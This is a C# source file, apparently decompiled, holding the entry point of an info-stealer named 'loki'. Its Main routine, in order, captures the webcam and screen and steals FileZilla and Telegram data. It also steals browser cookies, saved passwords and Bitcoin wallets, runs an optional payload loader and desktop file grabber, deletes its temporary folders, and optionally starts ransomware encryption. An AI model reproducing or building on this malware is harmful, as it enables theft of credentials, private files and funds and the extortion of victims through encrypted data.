using System;
using System.IO;
using Anubis;
using loki.loki.Ransomware;
using loki.loki.Utilies;
using loki.loki.Utilies.App;
using loki.loki.Utilies.Hardware;
using loki.loki.Utilies.Wallets;
using Loki.Utilities;
using NoFile;

namespace loki
{
	// Token: 0x02000019 RID: 25
	internal static class Program
	{
		// Token: 0x06000103 RID: 259 RVA: 0x00006C4C File Offset: 0x00004E4C
		[STAThread]
		private static void Main()
		{
			Directory.CreateDirectory(Program.dir);
			HomeDirectory.Create(GetDirPath.User_Name, true);
			if (Settings.webka)
			{
				GetWebCam.Get_webcam();
			}
			Screen.Get_scr(Program.dir);
			FileZilla.get_filezilla(Program.dir);
			Telegram.StealTelegram(Program.dir);
			if (Settings.loader)
			{
				Loader.Load();
			}
			if (Settings.grabber)
			{
				Grabber.Grab_desktop(Program.dir);
			}
			Steal.Cookies();
			Steal.Passwords();
			Wallets.BitcoinSteal(Program.dir);
			UserAgents.Get_agent(Program.dir);
			Browser_Parse.Parse(Program.dir);
			DomainDetect.Start(Helper.Browsers);
			Hardware.Info(Program.dir);
			Directory.Delete(Program.dir, true);
			Directory.Delete(GetDirPath.User_Name, true);
			if (Settings.ransomware)
			{
				RansomwareCrypt.Start();
			}
		}

		// Token: 0x04000049 RID: 73
		public static string dir = Path.GetTempPath() + "\\AX754VD.tmp";
	}
}
